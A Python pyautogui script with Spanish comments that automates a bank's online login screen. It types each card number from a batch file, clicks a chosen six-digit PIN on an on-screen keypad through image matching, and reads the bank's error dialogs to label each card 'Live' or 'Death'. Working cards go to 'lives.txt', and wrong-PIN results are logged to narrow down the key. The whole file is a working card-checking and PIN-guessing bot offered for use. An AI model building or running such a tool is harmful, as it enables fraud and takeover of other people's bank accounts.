import pyautogui 
import time
import datetime

#import cv2
#import telegram

donde_escribir = 238,345
ingresar = 218,393
linealote = 0
btn_reiniciarEQUIS = 299,343
btn_reiniciarArriba = 301,254
SalirSesion_SI_button = 297,432
Aceptar = 297,432

#lugar_clave = 349,552
#cancelar = 1502,994
#ok_error = 1641,614


def click (pos,click = 1 ):
	pyautogui.moveTo(pos)
	pyautogui.click(clicks=click)

def buscarnumero(numero):
	image = "./imagenes/"+str(numero) + '.png'
	#time.sleep(0.1)
	#flag = True
	loc = None
	while loc is None:
		loc = pyautogui.locateOnScreen(image, grayscale=True, confidence=0.9, region=(0,0,388,718))
		#print(loc)
		if loc == None:
			print("Probable error...")
			time.sleep(5)

	pyautogui.moveTo(loc)
	pyautogui.click()
	#print (loc)
def borrar(i):
	for i in range (1,i):
		pyautogui.press('backspace')
		
lives = open("lives.txt","a")
print("*************************************")
print("Escriba los datos: ")
num1 = input("Numero 1 : ")
num2 = input("Numero 2 : ")
num3 = input("Numero 3 : ")
num4 = input("Numero 4 : ")
num5 = input("Numero 5 : ")
num6 = input("Numero 6 : ")

print("***************")
print("Presione 'Enter' para continuar")
input()
print("\n")
print("Corriendo Bot")
print("3")
time.sleep(0.5)
print("2")
time.sleep(0.5)
print("1")
time.sleep(0.5)
print("\n")

#print("Equis")
click(btn_reiniciarEQUIS)
time.sleep(1)


with open ('./lote.txt') as texto:
	for x in texto:
		print("------------------")
		
		linealote += 1
		var = False	
		#time.sleep(0.2)
		click(donde_escribir)
		click(btn_reiniciarEQUIS)
		borrar(5)
		pyautogui.typewrite(x)
		#time.sleep(0.5)
		#click(lugar_clave)

		#calando del 1 al 6
		registro = open("registro.txt","w")
		registro.write(str(x)) # escribir en el block
		registro.write("\n")
		registro.close()
		
		a = None
		error1 = None
		contadorerror = 0
		while (a is None): #Esperando que cargue

			
			errorExtrano = "./imagenes/errorExtrano.png" # Por si encuentra el error extraño otra vez
			error1 = pyautogui.locateOnScreen(errorExtrano, grayscale=True, confidence=0.9, region=(0,0,388,718))#(49,322,292,138)) # x , y , ancho , alto
			if error1!=None:
				click(Aceptar)
				time.sleep(0.2)
				click(donde_escribir)
				click(btn_reiniciarEQUIS)
				borrar(5)
				pyautogui.typewrite(x)
				break

			aceptarerror = "./imagenes/aceptar.png" # Por si encuentra el error extraño otra vez
			aceptarerror1 = pyautogui.locateOnScreen(aceptarerror, grayscale=True, confidence=0.9, region=(49,322,292,138)) # x , y , ancho , alto
			if aceptarerror1!=None:
				click(aceptarerror1)
				time.sleep(0.2)
				click(donde_escribir)
				click(btn_reiniciarEQUIS)
				borrar(5)
				pyautogui.typewrite(x)
				break
				
			Numeros = "./imagenes/Numeros.png"
			a = pyautogui.locateOnScreen(Numeros, grayscale=True, confidence=0.9, region=(0,0,388,718)) # x , y , ancho , alto
			#print(a)
			#time.sleep(0.1)
			if (contadorerror > 20):
				print("Pasando...")
				break

		buscarnumero(num1)
		buscarnumero(num2)
		buscarnumero(num3)
		buscarnumero(num4)
		buscarnumero(num5)
		buscarnumero(num6)


		#print(x.rstrip())
		#time.sleep(0.1)
		#print("Intentando 123456 ")

		#for j in range (1,7):
		#	buscarnumero(j)
			#print(j)

		time.sleep(0.2)
		click(ingresar)
		#print("Verificando...")
		time.sleep(0.6)

		#Confirmacion :
		#Lives
		c = None
		d = None
		e = None
		f = None

		#Moridas
		b = None
		p = None
		q = None
		r = None
		u = None
		w = None

		contadorerror = 0
		contador = 0
		fechaActual = datetime.datetime.now()
		#flag = "flag1"
		while True: # Un " Y " poqe si no cumple 1 se rompe el bucle
			
			#contador += 1

			#if b!=None:
			#	break
			#aceptar = "./imagenes/aceptar.png"
			#b = pyautogui.locateOnScreen(aceptar, grayscale=True, confidence=0.9, region=(71,467,429,169))
			#click(b)
			#print("B",b)
			#if b!=None:
			#	break

			invalido = "./imagenes/invalido.png"
			r = pyautogui.locateOnScreen(invalido, grayscale=True, confidence=0.9, region=(49,322,292,138))
			#print("r",r)
			if r!=None:
				click(Aceptar)
				print("Tarjeta Invalida")
				break

			generarClave = "./imagenes/generarClave.png"
			u = pyautogui.locateOnScreen(generarClave, grayscale=True, confidence=0.9, region=(49,322,292,138))
			#print("u",u)
			if u!=None:
				click(Aceptar)
				print("Usted no ha generado su clave de internet")
				break

			inoperativa = "./imagenes/inoperativa.png"
			b = pyautogui.locateOnScreen(inoperativa, grayscale=True, confidence=0.9, region=(49,322,292,138))
			#print("B",b)
			if b!=None:
				click(Aceptar)
				print("Tarjeta inoperativa")
				break

			ClaveErronea = "./imagenes/ClaveErronea.png"
			q = pyautogui.locateOnScreen(ClaveErronea, grayscale=True, confidence=0.9, region=(49,322,292,138))
			#click(q)
			#print("Q",q)
			if q!=None:
				click(Aceptar)
				print("Limites de clave dada")
				break

			contraInco = "./imagenes/contraInco.png"
			p = pyautogui.locateOnScreen(contraInco, grayscale=True, confidence=0.9, region=(49,322,292,138))
			#click(p)
			#print("P",p)
			if p!=None:
				click(Aceptar)
				print("Contraseña Incorrecta")
				break

			cuentaahorroNoExiste = "./imagenes/cuentaahorroNoExiste.png"
			w = pyautogui.locateOnScreen(cuentaahorroNoExiste, grayscale=True, confidence=0.9, region=(49,322,292,138))
			#click(p)
			#print("w",w)
			if w!=None:
				click(Aceptar)
				print("Cuenta de Ahorro NO EXISTE")
				break

			# ------------------------------------------------------------------------------------------

			encontrado = "./imagenes/encontrado.png"
			c = pyautogui.locateOnScreen(encontrado, grayscale=True, confidence=0.9, region=(0,0,376,121))
			#print("c",c)
			if c!=None:
				break
			#click(c)

			encontrado2 = "./imagenes/encontrado2.png"
			d = pyautogui.locateOnScreen(encontrado2, grayscale=True, confidence=0.9, region=(0,0,388,718))
			#print("d",d)
			if d!=None:
				break
			#click(d)

			encontrado3 = "./imagenes/encontrado3.png"
			e = pyautogui.locateOnScreen(encontrado3, grayscale=True, confidence=0.9, region=(0,0,376,121))
			#print("e",e)
			if e!=None:
				break
			#click(e)
		
			
			#print("C",c)
			#if (b == None) or (c == None) or (d == None) or (e == None):
			#	time.sleep(0.2)
				#print("Espere...")
				#print(b)
				#time.sleep(5)
			if contadorerror > 7: # Por si no encuyentra ninguno
				print("-Ocurrió un error, espere....")	
				#input()
				click(btn_reiniciarArriba)
				time.sleep(1)
				click(btn_reiniciarArriba)
				break
			contadorerror += 1
		#print("Pasó del break")
		if (p!=None) or (q!=None): #Encontrar Claves
			EncontrarClave = open("EncontrarClave.txt","a")
			EncontrarClave.write(x.rstrip()) , " no es --> ", num1,num2,num3,num4,num5,num6  #escribir en el block
			EncontrarClave.write("\n")
			EncontrarClave.close()


		if (b!=None) or (p!=None) or (q!=None) or (r!=None) or (u!=None) or (w!=None): # MORIDAS!!!
			fechaActual2 = datetime.datetime.strftime(fechaActual, '%H:%M:%S')
			print(fechaActual2, " | ","N. ", linealote , ": ",  x.rstrip() +" -------------> Death")
			#Clickeando en reincio (esa equis del lado)
			#time.sleep(1)
			#print("Equis")
			click(btn_reiniciarEQUIS)

		if (c!=None) or (d!=None) or (e!=None) : # Por si es LIVE:
			print ('\a')
			fechaActual2 = datetime.datetime.strftime(fechaActual,'%H:%M:%S')
			print(fechaActual2, " | ","N. ", linealote ,": ",x.rstrip()+" -------------> Live" , " | " + num1+num2+num3+num4+num5+num6)
			lives = open("lives.txt","a")
			lives.write(x.rstrip()) , " | ", num1,num2,num3,num4,num5,num6  #escribir en el block
			lives.write("\n")
			lives.close()
			time.sleep(1)

			if (e!=None):
				click(SalirSesion_SI_button)
				pyautogui.press('esc')
				time.sleep(1)
			f = None
			if (c!=None) or (d!=None):
				while (f is None):
					#print("Cerrando sesión")
					#time.sleep(1)
					#print("Precionando escape")
					
					#time.sleep(1)
					#print("Buscando")
					SalirSesion = "./imagenes/SalirSesion.png"
					f = pyautogui.locateOnScreen(SalirSesion, grayscale=True, confidence=0.9, region=(0,0,388,718))
					#time.sleep(1)
					#print("f",f)
					if f!=None: # Si ya está el menu para salirse:
						#print("click")
						click(SalirSesion_SI_button)
						break
					else:
						click(SalirSesion_SI_button)
						time.sleep(0.2)
						pyautogui.press('esc')
						#print("Escape")

					time.sleep(1)
			time.sleep(1)
		

lives.close()
print("Programa finalizado")
print("se quedo en la linea: ", linealote)
print("*****************")
print("Presione 'Enter' para Finalizar")
input()



